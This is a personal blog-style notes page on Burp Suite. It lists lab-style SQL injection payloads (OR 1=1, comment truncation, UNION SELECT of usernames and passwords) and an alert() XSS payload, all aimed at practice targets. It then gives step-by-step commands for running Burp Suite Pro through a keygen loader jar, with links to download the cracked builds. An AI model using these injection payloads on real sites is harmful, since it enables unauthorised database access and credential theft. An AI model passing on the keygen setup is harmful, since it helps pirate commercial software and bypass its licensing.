---
title: Meow's Testing Tools - Burpsuite
date: 2019-09-17 11:11:11 -0400
categories: [10CyberAttack, CyberAttackTools]
tags: [CyberAttack, CyberAttackTools]
toc: true
image:
---

[toc]

---

# Burpsuite

---

test web: `www.dvwa.co.uk`

---

## Testing workflow

![burp-workflow](https://i.imgur.com/IlK1tx3.jpg)


---


## SQL injection


![Screen Shot 2020-11-18 at 12.29.51](https://i.imgur.com/XqX9weI.png)

`UPDATE, INSERT, SELECT, ORDER BY`

1. retrieve hidden data:
   1. input: Gifts
   2. `http://web/products?category=Gifts`
   3. `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
   4. input: Gifts'--
   5. `http://web/products?category=Gifts'--`
   6. `SELECT * FROM products WHERE category = 'Gifts'`--' AND released = 1
   7. input: Gifts`'+OR+1=1--`
   8. `http://web/products?category=Gifts'+OR+1=1--`
   9. `SELECT * FROM products WHERE category = 'Gifts' OR 1=1`--' AND released = 1
2. subverting application logic
   1. `GET /web3/login/?id=1&Submit=Submit HTTP/1.1`
   2. `GET /web3/login/?id=1'OR 1=1 #`&Submit=Submit `HTTP/1.1`
   3. `GET /web3/login/?id=1'+OR+1+%3d+1+%23&`Submit=Submit `HTTP/1.1`
   4. input: admin 12345
   5. `SELECT * FROM user WHERE username = 'admin' AND password = '12345'`
   6. input: admin'--
   7. `SELECT * FROM user WHERE username = 'admin'`--' AND password = '12345'
3. retrieve data from other database tables
   1. input: Gifts
   2. `SELECT name, description FROM products WHERE category = 'Gifts'`
   3. input: Gifts' UNION SELECT username, password From users--
   4. `SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password From users`--
4. examining the database
   1. oracle: `SELECT * FROM v$version`
   2. list the table and database: `SELECT * FROM information_schema.tables`
5. blind SQL injection vulnerabilities


detecting SQL injection vulnerabilities: use scanner


[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

lab:

```
https://abc.net/filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL--


```


---

## XSS Exploitation

1. execute payload as `<script>alert(“hello”)</script>`


# install burpsuite


[file](https://drive.google.com/drive/folders/1YKAeBIXPeUFW78buqRlJ9Yg1Ln6W2f1R)

```bash
# Install homebrew

rm -rf /Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk

# Tap homebrew/cask-versions
brew tap homebrew/cask-versions

# install java8:
brew cask install adoptopenjdk8

# Check if java8 is successfully installed or not
/usr/libexec/java_home -verbose

# cd to the file
cd /Applications/Burp\ Suite\ Community\ Edition.app/Contents/java/app

# Window1:
/Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home/bin/java -jar burp-loader-keygen-2_1_07.jar

-jar burp-loader-keygen.jar

# add file
-Xbootclasspath/p:burp-loader-keygen-2_1_07.jar

# Window2:
/Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home/bin/java -jar burpsuite_pro_v2.1.07.jar

/Library/Java/JavaVirtualMachines/liberica-jdk-8.jdk/Contents/Home/bin/java -jar burpsuite_pro_v1.7.31


# Create a Bash Alias
# If you are missing a .bash_profile
burp2.1()
{
/Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home/bin/java -jar /Applications/Burp\ Suite\ Community\ Edition.app/Contents/java/app/burpsuite_pro_v2.1.07.jar
}

# Run
source ~/.bash_profile
# or
source ~/.zshrc

# Now you can type burp2.1 in terminal to open Burp Suite directly
```

[link](https://www.cnblogs.com/shaosks/p/13367761.html)
[link](https://github.com/raystyle/BurpSuite_Pro_v1.7.32)
[link](https://resources.infosecinstitute.com/burpsuite-tutorial/)






.
